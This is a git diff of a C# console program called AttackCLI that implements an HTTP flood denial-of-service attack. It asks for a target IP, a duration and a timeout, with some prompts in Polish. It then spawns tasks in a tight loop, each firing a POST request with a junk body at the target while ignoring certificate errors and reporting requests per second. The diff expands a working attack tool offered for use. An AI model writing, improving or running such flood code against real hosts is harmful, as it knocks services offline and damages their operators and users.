@@ -1,67 +1,111 @@
-﻿using System.Globalization;
+﻿using System.Diagnostics;
+using System.Diagnostics.CodeAnalysis;
+using System.Globalization;
+using System.Runtime.CompilerServices;
 using RestSharp;
 
 namespace AttackCLI
 {
     class Program
     {
+        private static int operationTimeInSeconds = 10;
+        private static DateTime endTime;
 
         static void Main(string[] args)
         {
-
             DDOSAttack();
-
         }
 
 
-
+        public static void WriteToConsole(string Message)
+        {
+            lock (Console.Out)
+            {
+                Console.WriteLine(Message);
+            }
+        }
+        
+        [SuppressMessage("ReSharper.DPA", "DPA0002: Excessive memory allocations in SOH", MessageId = "type: System.Threading.Tasks.Task; size: 3909MB")]
+        [SuppressMessage("ReSharper.DPA", "DPA0000: DPA issues")]
         static void DDOSAttack()
         {
             var ipToAttack = "";
             Task attackCreator = null;
-            List<Task> runningTasks = new List<Task>();
             int numberOfTaskCreators = 1;
-
+            double timeout = 1;
             if (string.IsNullOrEmpty(ipToAttack))
             {
                 Console.Write("Please enter a valid IP address to attack:");
                 ipToAttack = Console.ReadLine();
             }
-
-
-            Console.WriteLine($"Do tou want to chane number of Task Creators ({numberOfTaskCreators}):\n (yes/no)");
-            if (Console.ReadLine() == "yes")
+            
+            Console.WriteLine("Jaki ma byc zamierzony czas operacyjny ( w sekundach )?:");
+            try
             {
-                Console.WriteLine("Enter new number :");
-                int newNumber = int.Parse(Console.ReadLine());
-                numberOfTaskCreators = newNumber is > 1 and < 100 ? newNumber : 1;
+                operationTimeInSeconds = int.Parse(Console.ReadLine());
             }
-            Console.WriteLine($"Uruchamiam attack na ip: https://{ipToAttack}");
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error parsing operation time. Time set to 10 seconds");
+                operationTimeInSeconds = 10;
+            }
+
+            Console.WriteLine("Podaj timeout w sekundach");
+            timeout = double.Parse(Console.ReadLine());
+            
+            endTime = DateTime.Now.AddSeconds(operationTimeInSeconds);
+            Console.WriteLine($"Uruchamiam attack na ip: https://{ipToAttack} Methodą POST z body: \n AASDAWEQ#RQWQ@#!)$%&!)@#$!#*%T(QIFYOC $!@O*(%@#!@$QWRE@$F!%$!!G$%!@ liujfglik;sgkilsjf;wilunhvoi214uoi@u34o1upvt894gvujm4028vtr7uvuewq89cfmjf82ty2");
             attackCreator = new Task(() =>
             {
-                var task = new Task(() =>
+                var requestsPerSecond = 0;
+                var secondsToEnd = endTime.Second - DateTime.Now.Second;
+                while (DateTime.Now < endTime)
                 {
-                    using var client = new RestClient($"https://{ipToAttack}", options =>
+                    var secondsToEndUpdate = endTime.Second - DateTime.Now.Second;
+                                 if (secondsToEndUpdate < secondsToEnd)
+                                 {
+                                     secondsToEnd = secondsToEndUpdate;
+                                     WriteToConsole($"({secondsToEndUpdate}secs) Requests per second {requestsPerSecond}");
+                                     requestsPerSecond = 0;
+                                     Console.WriteLine($"Memory usage {Process.GetCurrentProcess().WorkingSet64 / 1024 / 1024} MB");
+                                     if (Process.GetCurrentProcess().PrivateMemorySize64 / 1024 / 1024 / 1024 > 30_000)
+                                     {
+                                         Console.WriteLine("Pamieć przepełniona!");
+                                         continue;
+                                     }
+
+                                 }
+                    var task = new Task(() =>
                     {
-                        options.Timeout = TimeSpan.FromSeconds(1);
-                        options.RemoteCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => true;
+                        using var client = new RestClient($"https://{ipToAttack}", options =>
+                        {
+                            options.Timeout = TimeSpan.FromSeconds(timeout);
+                            options.RemoteCertificateValidationCallback =
+                                (sender, certificate, chain, sslPolicyErrors) => true;
+                        });
+                        try
+                        {
+                            client.Execute(new RestRequest("", Method.Post)
+                                .AddBody("AASDAWEQ#RQWQ@#!)$%&!)@#$!#*%T(QIFYOC $!@O*(%@#!@$QWRE@$F!%$!!G$%!@$F!@" +
+                                         "liujfglik;sgkilsjf;wilunhvoi214uoi@u34o1upvt894gvujm4028vtr7uvuewq89cfmjf82ty2"));
+                            
+                        }
+                        catch (Exception ex)
+                        {
+                            WriteToConsole($"Error: {ex.Message}");
+                        }
+
+                       
                     });
-                    try
-                    {
-                        
-                        client.Get(new RestRequest(""));
-                        Console.Write("Dziab!");
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine($"Error: {ex.Message}");
-                    }
-
-
-                });
-                task.Start();
-                runningTasks.Add(task);
+                    task.Start();
+                    requestsPerSecond += 1;
+                }
             });
+            
+            attackCreator.Start();
+            Thread.Sleep(operationTimeInSeconds * 1000 + 2000); 
+            //Console.WriteLine("Press any key to exit...");
+            Console.ReadKey();
         }
     }
 }
